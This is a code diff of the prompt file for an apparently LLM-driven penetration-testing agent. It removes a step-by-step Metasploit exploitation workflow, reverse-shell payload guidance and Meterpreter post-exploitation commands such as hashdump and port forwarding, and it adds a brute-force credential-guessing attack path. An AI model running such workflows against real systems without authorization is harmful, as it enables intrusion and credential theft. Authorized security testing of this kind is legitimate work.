@@ -1,24 +1,16 @@
 """
-RedAmon Agent Prompts
+RedAmon Agent Base Prompts
 
-System prompts for the ReAct agent orchestrator.
-Includes phase-aware reasoning, tool descriptions, and structured output formats.
+Common prompts used across all attack paths.
 """
 
 from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder
-from utils import get_session_config_prompt
-from params import (
-    INFORMATIONAL_SYSTEM_PROMPT,
-    EXPL_SYSTEM_PROMPT,
-    POST_EXPL_SYSTEM_PROMPT,
-)
 
 
 # =============================================================================
-# OPTIMIZED PROMPT COMPONENTS
+# TOOL AVAILABILITY AND MODE MATRICES
 # =============================================================================
 
-# Tool availability matrix (concise, no full descriptions)
 TOOL_AVAILABILITY = """
 ## Available Tools (Current Phase: {phase})
 
@@ -37,7 +29,6 @@ TOOL_AVAILABILITY = """
 **Current phase allows:** {allowed_tools}
 """
 
-# Mode decision matrix (statefull vs stateless)
 MODE_DECISION_MATRIX = """
 ## Current Mode: {mode}
 
@@ -55,7 +46,7 @@ MODE_DECISION_MATRIX = """
 
 
 # =============================================================================
-# PHASE-SPECIFIC TOOL DESCRIPTIONS (Original - keep for now, will optimize later)
+# INFORMATIONAL PHASE TOOLS
 # =============================================================================
 
 INFORMATIONAL_TOOLS = """
@@ -82,7 +73,12 @@ INFORMATIONAL_TOOLS = """
    - Example args: "-host 10.0.0.5 -p 80,443,8080 -json"
 """
 
-EXPLOITATION_TOOLS = """
+
+# =============================================================================
+# COMMON METASPLOIT HEADER
+# =============================================================================
+
+METASPLOIT_CONSOLE_HEADER = """
 ### Exploitation Phase Tools
 
 All Informational tools PLUS:
@@ -92,338 +88,7 @@ All Informational tools PLUS:
    - Module context and sessions persist between calls
    - **CRITICAL**: Send ONE command per call (semicolon chaining does NOT work)
    - Metasploit state is auto-reset on first use in each session
-
-   ## MANDATORY EXPLOITATION WORKFLOW 
-
-   **This is the SINGLE SOURCE OF TRUTH for exploitation workflow.**
-   **NEVER guess module names!** Module names are NOT predictable from CVE IDs.
-
-   Complete ALL 13 steps in order (ONE COMMAND PER CALL):
-
-   ### 1. Search for CVE
-   `"search CVE-XXXX-XXXXX"` → Returns EXACT module path(s)
-
-   ### 2. Use module
-   `"use exploit/path/from/search"` → Load module from step 1
-
-   ### 3. Get module info
-   `"info"` → Overview of module (description, references, general info)
-
-   ### 4. Show targets
-   `"show targets"` → List all available targets (OS/app versions)
-
-   ### 5. Show options
-   `"show options"` → Display all configurable parameters with current values
-
-   ### 6. Set TARGET (MOST COMMON FAILURE POINT!)
-   `"set TARGET <N>"` → Choose based on mode:
-
-   **Current mode determines which TARGET type to use:**
-   - **Statefull mode** → Use "Dropper", "Staged", or "Meterpreter" targets (creates persistent session)
-   - **Stateless mode** → Use "Command", "In-Memory", or "Exec" targets (returns command output)
-
-   **Why this matters:**
-   - Wrong TARGET type = Incompatible payload error OR exploit succeeds but no session/output
-   - Always run `show targets` first and select the appropriate type for your current mode
-   - This is the #1 cause of failed exploitations - verify mode before selecting TARGET
-
-   ### 7. Show payloads
-   `"show payloads"` → List payloads compatible with selected TARGET
-
-   ### 8. Set CVE variant (if applicable)
-   `"set CVE CVE-XXXX-XXXXX"` → Only if module supports multiple CVE variants
-
-   Check `show options` output for CVE option. Match variant to target's software version.
-   **Wrong variant = "not vulnerable" error even if target IS vulnerable.**
-
-   ### 9. Set PAYLOAD
-   `"set PAYLOAD <payload>"` → See "Payload Selection" section below
-
-   ### 10. Set target connection options
-   Each as separate call:
-   - `"set RHOSTS <target-ip>"`
-   - `"set RPORT <target-port>"`
-   - `"set SSL false"` (or `true` for HTTPS)
-
-   ### 11. Set mode-specific options
-
-   **Statefull mode with REVERSE payload (reverse_tcp/reverse_https):**
-   - `"set LHOST <your-attacker-ip>"` - Your IP that the target will connect BACK to
-     - REQUIRED for reverse payloads (target connects TO you)
-   - `"set LPORT <port-number>"` - Port you'll listen on 
-
-   **Statefull mode with BIND payload (bind_tcp):**
-   - `"set LPORT <target-port>"` - Port the target will open 
-   - NO LHOST needed (you connect TO the target, not the other way around)
-
-   **Stateless mode:**
-   - `"set CMD id"` (safe PoC command like "id", "whoami", "uname -a")
-   - `"set AllowNoCleanup true"` (if module requires it)
-
-   ### 12. Execute exploit
-   `"exploit"`
-
 """
-
-# =============================================================================
-# PAYLOAD GUIDANCE (Conditional based on POST_EXPL_PHASE_TYPE)
-# =============================================================================
-
-PAYLOAD_GUIDANCE_STATEFULL = """
-## Payload Selection (Statefull Mode) - SESSION REQUIRED
-
-**GOAL: You MUST establish a Meterpreter/shell session!**
-
-**Target Selection:** Use "Dropper", "Staged", or "Meterpreter" targets (see EXPLOITATION_TOOLS Step 6).
-
-### Payload Selection (Session-capable only!)
-
-**Choose based on network conditions and available payloads from `show payloads`:**
-- **bind_tcp** → Target opens port, you connect TO target. Use when you can reach target's ports.
-- **reverse_tcp** → You listen, target connects BACK to you. Use when target can reach your IP.
-- **reverse_http/https** → HTTP(S) connection, good for bypassing firewalls.
-
-**Example session-capable payloads (check `show payloads` output for available options):**
-- `cmd/unix/python/meterpreter/bind_tcp`
-- `cmd/unix/python/meterpreter/reverse_tcp`
-- `cmd/unix/python/meterpreter/reverse_http`
-- `linux/x64/meterpreter/bind_tcp`
-- `linux/x64/meterpreter/reverse_tcp`
-- `windows/meterpreter/reverse_tcp`
-
-**Choose the appropriate payload based on:**
-1. Target OS (Linux, Windows, Unix)
-2. Network reachability (bind vs reverse)
-3. Firewall restrictions (HTTP/HTTPS if needed)
-4. Available payloads from `show payloads` output
-
-**NEVER use:** `cmd/unix/generic`, `cmd/unix/reverse`, or other stateless payloads!
-
-### After Exploit - What to Look For
-
-**Success indicators:**
-- `[*] Meterpreter session X opened` → Session created! ✓
-- `[*] Sending stage...` → Wait for transfer
-
-**Failure indicators:**
-- Command output like `uid=0(root)` WITHOUT session → Wrong TARGET! Check `show targets` and select a Dropper/Staged/Meterpreter target
-- `[-] Exploit failed` → Check RHOSTS/RPORT settings
-
-**After session opens:** Request transition to `post_exploitation` phase.
-"""
-
-PAYLOAD_GUIDANCE_STATELESS = """
-## Payload Selection (Stateless Mode, no sessions)
-
-**GOAL: Prove RCE with a single command execution, without session activation.**
-
-**Target Selection:** Use "Command", "In-Memory", or "Exec" targets (see EXPLOITATION_TOOLS Step 6).
-**Payload:** `cmd/unix/generic` or `cmd/windows/generic`
-**Required options:** `set CMD id` and `set AllowNoCleanup true` (if needed)
-
-### After Exploit
-
-- Success = command output visible (e.g., `uid=0(root)...`)
-- No output = wrong TARGET selected, change and retry
-
-### STOP After Proof!
-
-After successful PoC:
-- If user requested specific post-exploitation actions → `action="transition_phase"`
-- If user just wanted to test vulnerability → `action="ask_user"` to confirm next steps
-"""
-
-POST_EXPLOITATION_TOOLS_STATEFULL = """
-### Post-Exploitation Phase Tools (Statefull Mode)
-
-You have an active Meterpreter session. Use `metasploit_console` for all operations.
-
-## Context Detection (check PREVIOUS output)
-
-| Prompt | Context | Next Action |
-|--------|---------|-------------|
-| `meterpreter >` | Meterpreter | Run meterpreter commands |
-| `msf6 >` | MSF console | `sessions -i 1` to re-enter |
-| `$` or `#` | OS shell | `exit` to return to meterpreter |
-
-## Quick Reference: Meterpreter vs Shell
-
-**USE METERPRETER FOR:**
-- Stealth (in-memory, no disk writes)
-- Pivoting: `portfwd`, `route add`
-- Process migration: `migrate <PID>`
-- Windows privesc: `getsystem`
-- Post modules: `run post/multi/gather/...`
-- File transfer: `upload`, `download`
-
-**DROP TO SHELL FOR:**
-- File writes: `echo 'x' > file` (meterpreter has NO echo!)
-- Native commands: `grep`, `find`, `awk`, `sed`
-- Minimal containers (Docker/Alpine) where stdapi fails
-
-## CRITICAL: stdapi Failure Recovery
-
-**If you see:** `stdapi_fs_stat: Operation failed: 1` or empty output from `ls`/`pwd`
-
-**DO NOT RETRY.** Drop to shell immediately:
-```
-shell
-echo 'content' > /path/file
-exit
-```
-
-## Meterpreter Commands (subset - no shell equivalents!)
-
-| Command | Purpose | Shell Equivalent |
-|---------|---------|------------------|
-| `sysinfo` | System info | `uname -a` |
-| `getuid` | Current user | `whoami` |
-| `pwd` / `ls` / `cd` | Navigation | Same |
-| `cat /path` | Read file | Same |
-| `download /path` | Copy to attacker | `scp` |
-| `upload local remote` | Copy to target | `scp` |
-| `ps` | Process list | `ps aux` |
-| `migrate <PID>` | Move to process | N/A |
-| `hashdump` | Dump hashes (Win) | N/A |
-| `portfwd add -l 4444 -p 80 -r target` | Port forward | N/A |
-
-**NOT in Meterpreter:** `echo`, `grep`, `awk`, `sed`, `chmod`, `chown` → use `shell`
-
-## File Modification (in order of preference)
-
-1. **Shell (simple writes):** `shell` → `echo 'x' > file` → `exit`
-2. **Meterpreter upload:** `upload /tmp/local /remote/path`
-3. **Meterpreter execute:** `execute -f /bin/sh -a '-c "echo x > file"'`
-
-## Session Management (from msf6 > only)
-
-```
-background          → Return to msf console (keeps session)
-sessions -l         → List sessions
-sessions -i 1       → Re-enter session 1
-sessions -k 1       → Kill session 1
-```
-
-## Error Handling
-
-| Error | Cause | Action |
-|-------|-------|--------|
-| `stdapi_fs_*: Operation failed` | Minimal container/restricted env | Drop to `shell` |
-| `No active sessions` | Session died | Inform user, offer re-exploit |
-| `Unknown command: X` | Using shell cmd in meterpreter | Drop to `shell` first |
-
-## Ask User Before Impactful Actions
-
-Use `action="ask_user"` before: privilege escalation, data exfiltration, persistence, file modifications, lateral movement.
-"""
-
-POST_EXPLOITATION_TOOLS_STATELESS = """
-### Post-Exploitation Phase Tools (Stateless Mode)
-
-You are now in POST-EXPLOITATION phase. The exploit has been proven to work.
-In stateless mode, you execute commands by re-running the exploit with different CMD values.
-
-## IMPORTANT: Ask User What to Do!
-
-**Before running any commands, ASK the user what they want to do:**
-- Use `action="ask_user"` to get user direction
-- Do NOT assume what the user wants based on their original request
-- Present options like: reconnaissance, file access, defacement, persistence, etc.
-
-**Workflow (after user specifies what to do):**
-1. The exploit module should still be loaded from exploitation phase
-2. Change the CMD option: `set CMD "<command>"`
-3. Re-run: `exploit`
-4. Capture output
-5. Repeat for each command
-
-**Typical post-exploitation actions (after user approval):**
-- Check current user/privileges
-- Gather system information
-- List users and directories
-- Read configuration files
-- Check network connections
-
-Use commands appropriate for the target OS (determined during exploitation).
-
-**IMPORTANT:**
-- Session-based tools (msf_sessions_list, msf_session_run, etc.) are NOT available in stateless mode
-- ALWAYS ask user before performing destructive operations (file writes, data modification)
-- Each command requires re-running the exploit
-"""
-
-def get_phase_tools(phase: str, activate_post_expl: bool = True, post_expl_type: str = "stateless") -> str:
-    """Get tool descriptions for the current phase with payload guidance.
-
-    Args:
-        phase: Current agent phase (informational, exploitation, post_exploitation)
-        activate_post_expl: If True, post-exploitation phase is available.
-                           If False, exploitation is the final phase.
-        post_expl_type: "statefull" for Meterpreter sessions, "stateless" for single commands.
-
-    Returns:
-        Concatenated tool descriptions appropriate for the phase and mode.
-    """
-    parts = []
-    is_statefull = post_expl_type == "statefull"
-
-    # Add phase-specific custom system prompt if configured
-    if phase == "informational" and INFORMATIONAL_SYSTEM_PROMPT:
-        parts.append(f"## Custom Instructions\n\n{INFORMATIONAL_SYSTEM_PROMPT}\n")
-    elif phase == "exploitation" and EXPL_SYSTEM_PROMPT:
-        parts.append(f"## Custom Instructions\n\n{EXPL_SYSTEM_PROMPT}\n")
-    elif phase == "post_exploitation" and POST_EXPL_SYSTEM_PROMPT:
-        parts.append(f"## Custom Instructions\n\n{POST_EXPL_SYSTEM_PROMPT}\n")
-
-    # Determine allowed tools for current phase
-    if phase == "informational":
-        allowed_tools = "query_graph, execute_curl, execute_naabu"
-    elif phase == "exploitation":
-        allowed_tools = "query_graph, execute_curl, execute_naabu, metasploit_console"
-    elif phase == "post_exploitation":
-        allowed_tools = "query_graph, execute_curl, execute_naabu, metasploit_console"
-    else:
-        allowed_tools = "query_graph, execute_curl, execute_naabu"
-
-    # Add tool availability matrix (concise, no redundancy)
-    parts.append(TOOL_AVAILABILITY.format(phase=phase, allowed_tools=allowed_tools))
-
-    # Add mode decision matrix for exploitation/post-expl
-    if phase in ["exploitation", "post_exploitation"]:
-        # Mode context
-        target_types = "Dropper/Staged/Meterpreter" if is_statefull else "Command/In-Memory/Exec"
-        post_expl_note = "Interactive session commands available" if is_statefull else "Re-run exploit with different CMD values"
-
-        parts.append(MODE_DECISION_MATRIX.format(
-            mode=post_expl_type,
-            target_types=target_types,
-            post_expl_note=post_expl_note
-        ))
-
-    # Add phase-specific workflow guidance
-    if phase == "informational":
-        parts.append(INFORMATIONAL_TOOLS)  # Full tool descriptions with examples
-    elif phase == "exploitation":
-        parts.append(EXPLOITATION_TOOLS)  # Metasploit workflow
-        # Select payload guidance based on post_expl_type
-        payload_guidance = PAYLOAD_GUIDANCE_STATEFULL if is_statefull else PAYLOAD_GUIDANCE_STATELESS
-        parts.append(payload_guidance)
-        # Add pre-configured session settings for statefull mode only
-        if is_statefull:
-            session_config = get_session_config_prompt()
-            if session_config:
-                parts.append(session_config)
-        # Add note about post-exploitation availability
-        if not activate_post_expl:
-            parts.append("\n**NOTE:** Post-exploitation phase is DISABLED. Complete exploitation and use action='complete'.\n")
-    elif phase == "post_exploitation":
-        # Select post-exploitation tools based on mode (NO redundant tool descriptions)
-        if is_statefull:
-            parts.append(POST_EXPLOITATION_TOOLS_STATEFULL)
-        else:
-            parts.append(POST_EXPLOITATION_TOOLS_STATELESS)
-
-    return "\n".join(parts)
 
 
 # =============================================================================
@@ -470,10 +135,10 @@ The orchestrator handles transitions automatically in some cases:
 
 | Transition Type                | Orchestrator Behavior                                    | Your Action                          |
 |--------------------------------|----------------------------------------------------------|--------------------------------------|
-| Same phase → Same phase        | Ignored, returns to think                                | Don't re-request same phase          |
-| Exploitation → Informational   | Auto-approved (safe downgrade)                           | Transition happens immediately       |
-| Info → Exploitation            | Requires user approval                                   | Use action="transition_phase"        |
-| Exploitation → Post-Expl       | Requires user approval                                   | Use action="transition_phase"        |
+| Same phase -> Same phase        | Ignored, returns to think                                | Don't re-request same phase          |
+| Exploitation -> Informational   | Auto-approved (safe downgrade)                           | Transition happens immediately       |
+| Info -> Exploitation            | Requires user approval                                   | Use action="transition_phase"        |
+| Exploitation -> Post-Expl       | Requires user approval                                   | Use action="transition_phase"        |
 | Just transitioned              | Marker set (`_just_transitioned_to`), ignores duplicates | Don't re-request immediately         |
 
 **Key takeaway:** Don't request transition to the phase you're already in - orchestrator ignores these requests and returns you to think.
@@ -519,10 +184,45 @@ For RESEARCH requests, use Neo4j as the primary source:
 
 {available_tools}
 
+## Attack Path Classification
+
+**Classified Attack Path**: {attack_path_type}
+
+| Attack Path | Description | Exploitation Method |
+|-------------|-------------|---------------------|
+| `cve_exploit` | Exploit known CVE vulnerabilities | Use Metasploit exploit modules |
+| `brute_force_credential_guess` | Guess credentials via brute force | Use Metasploit login scanner modules |
+
+### Attack Path Behavior (CRITICAL!)
+
+**If attack_path is `brute_force_credential_guess`:**
+- **SKIP username/credential reconnaissance** - you do NOT need to find usernames first!
+- The brute force workflow uses DEFAULT WORDLISTS that contain common usernames
+- In informational phase: Just verify the target service is reachable (1 query max)
+- Then IMMEDIATELY request transition to exploitation phase
+- Do NOT search the graph for usernames, credentials, or user accounts
+- Do NOT enumerate other services looking for usernames
+
+**If attack_path is `cve_exploit`:**
+- In informational phase: Gather target info (IP, port, service version, CVE details)
+- Then request transition to exploitation phase
+
+### TODO List Guidelines
+
+**In INFORMATIONAL phase:**
+- Create ONLY minimal reconnaissance TODOs
+- For `brute_force_credential_guess`: Just "Verify target service" then "Request exploitation"
+- For `cve_exploit`: Gather CVE target info then "Request exploitation"
+
+**In EXPLOITATION phase:**
+- Follow the MANDATORY workflow for your classified attack path
+- The workflow provides all steps you need
+
 ## Current State
 
 **Iteration**: {iteration}/{max_iterations}
 **Current Objective**: {objective}
+**Attack Path**: {attack_path_type}
 
 ### Previous Objectives
 {objective_history_summary}
@@ -635,7 +335,7 @@ Use `action="complete"` when the **CURRENT objective** is achieved, NOT the enti
 - After completion, the user may provide a NEW objective in the same session
 - ALL previous context is preserved: execution_trace, target_info, and objective_history
 - You can reference previous work when addressing new objectives
-- Single objectives can span multiple phases (informational → exploitation → post-exploitation)
+- Single objectives can span multiple phases (informational -> exploitation -> post-exploitation)
 
 **Exploitation Completion Triggers:**
 - PoC Mode: After successfully executing the exploit and capturing command output as proof
@@ -651,14 +351,14 @@ Use `action="complete"` when the **CURRENT objective** is achieved, NOT the enti
 
 **Example - Multi-Objective Session:**
 Objective 1: "Scan 192.168.1.1 for open ports"
-- After scanning completes → action="complete"
+- After scanning completes -> action="complete"
 - User provides new message: "Now exploit CVE-2021-41773"
 - This becomes Objective 2 (NEW objective, but same session)
 - Previous scan results are still in execution_trace and target_info
 - You can reference them when working on the exploit
 
 **Verification is BUILT-IN:**
-- If the exploit command output shows success (no errors, command executed) → Trust it and complete
+- If the exploit command output shows success (no errors, command executed) -> Trust it and complete
 - Only verify if the output is unclear or shows errors
 
 ### Tool Arguments:
@@ -835,9 +535,11 @@ FINAL_REPORT_PROMPT = """Generate a summary report of the penetration test sessi
 Generate a concise but comprehensive report including:
 1. **Summary**: Brief overview of what was accomplished
 2. **Key Findings**: Most important discoveries
-3. **Vulnerabilities Found**: List with severity if known
-4. **Recommendations**: Next steps or remediation advice
-5. **Limitations**: What couldn't be tested or verified
+3. **Discovered Credentials**: Any valid credentials found during brute force attacks (username:password pairs with target host)
+4. **Sessions Established**: Any active sessions from successful exploitation (session ID, type, target)
+5. **Vulnerabilities Found**: List with severity if known
+6. **Recommendations**: Next steps or remediation advice
+7. **Limitations**: What couldn't be tested or verified
 """
 
 
@@ -887,7 +589,7 @@ Each node has `user_id` and `project_id` properties for tenant isolation (handle
 
 ## Node Types and Key Properties
 
-### Infrastructure Nodes (Hierarchy: Domain → Subdomain → IP → Port → Service)
+### Infrastructure Nodes (Hierarchy: Domain -> Subdomain -> IP -> Port -> Service)
 
 **Domain** - Root domain being assessed
 - name (string): "example.com"
@@ -914,7 +616,7 @@ Each node has `user_id` and `project_id` properties for tenant isolation (handle
 - version (string): service version
 - banner (string): raw banner
 
-### Web Application Nodes (Hierarchy: BaseURL → Endpoint → Parameter)
+### Web Application Nodes (Hierarchy: BaseURL -> Endpoint -> Parameter)
 
 **BaseURL** - HTTP-probed base URLs
 - url (string): "https://api.example.com:443"
@@ -1055,7 +757,7 @@ RETURN v.name, v.source, v.cvss_score
 LIMIT 20
 
 // Web vulnerabilities on specific subdomain
-MATCH (s:Subdomain {name: "api.example.com"})<-[:BELONGS_TO]-(b:BaseURL)
+MATCH (s:Subdomain {{name: "api.example.com"}})<-[:BELONGS_TO]-(b:BaseURL)
       -[:HAS_ENDPOINT]->(e:Endpoint)<-[:FOUND_AT]-(v:Vulnerability)
 WHERE v.severity IN ["critical", "high"]
 RETURN e.url, v.name, v.severity
@@ -1088,7 +790,7 @@ RETURN t.name, t.version, c.id, c.severity, c.cvss
 ### Infrastructure Overview
 ```cypher
 // All subdomains for a domain
-MATCH (s:Subdomain)-[:BELONGS_TO]->(d:Domain {name: "example.com"})
+MATCH (s:Subdomain)-[:BELONGS_TO]->(d:Domain {{name: "example.com"}})
 RETURN s.name
 
 // Open ports on subdomains
@@ -1121,9 +823,9 @@ RETURN s.name, collect(t.name) as technologies
 3. **Relationship direction matters** - follow the arrows exactly as documented
 4. **Use property filters** in WHERE clauses, not relationship traversals for filtering
 5. **Check vulnerability source** when querying Vulnerability nodes:
-   - source="nuclei" → web/DAST vulnerabilities (FOUND_AT, AFFECTS_PARAMETER)
-   - source="gvm" → network vulnerabilities (HAS_VULNERABILITY from IP/Subdomain)
-   - source="security_check" → DNS/email security checks (SPF, DMARC)
+   - source="nuclei" -> web/DAST vulnerabilities (FOUND_AT, AFFECTS_PARAMETER)
+   - source="gvm" -> network vulnerabilities (HAS_VULNERABILITY from IP/Subdomain)
+   - source="security_check" -> DNS/email security checks (SPF, DMARC)
 6. **Case sensitivity**:
    - Vulnerability.severity is lowercase: "critical", "high", "medium", "low"
    - CVE.severity is uppercase: "CRITICAL", "HIGH", "MEDIUM", "LOW"
